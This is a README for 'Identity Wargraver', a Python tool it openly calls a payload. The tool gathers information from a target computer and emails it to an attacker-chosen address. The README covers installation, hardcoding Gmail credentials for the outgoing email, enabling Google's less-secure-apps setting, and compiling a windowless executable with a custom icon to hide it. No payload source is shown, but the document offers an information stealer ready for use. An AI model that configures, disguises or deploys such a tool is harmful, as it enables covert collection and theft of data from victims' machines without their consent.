# Identity Wargraver
A full fledged payload written in pure python3 that sends information about a target computer via email.

## Installation
### Debian
```
$ sudo apt-get install python3 python3-pip git
$ git clone https://github.com/MrSharkSpamBot/IdentityWargraver.git
$ cd IdentityWargraver/
$ pip3 install -r requirements.txt
```
### Arch
```
$ sudo pacman -S python python-pip git
$ git clone https://github.com/MrSharkSpamBot/IdentityWargraver.git
$ cd IdentityWargraver/
$ pip3 install -r requirements.txt
```

## Usage
This payload can run on Linux, Windows, and MacOS. To configure the payload go to line 62 and replace GMAIL with the gmail you want to use to send the email and replace PASSWORD with the password of said gmail account. Also go to line 66 and replace GMAIL with the same gmail in line 62 and replace TO with the recipient of this email. For this to work you need to put less secure apps on, on your google account. This can be done from the link: https://myaccount.google.com/lesssecureapps.

## Compilation
```
pyinstaller --onefile --noconsole --icon icon.ico IdentityWargraver.py
```
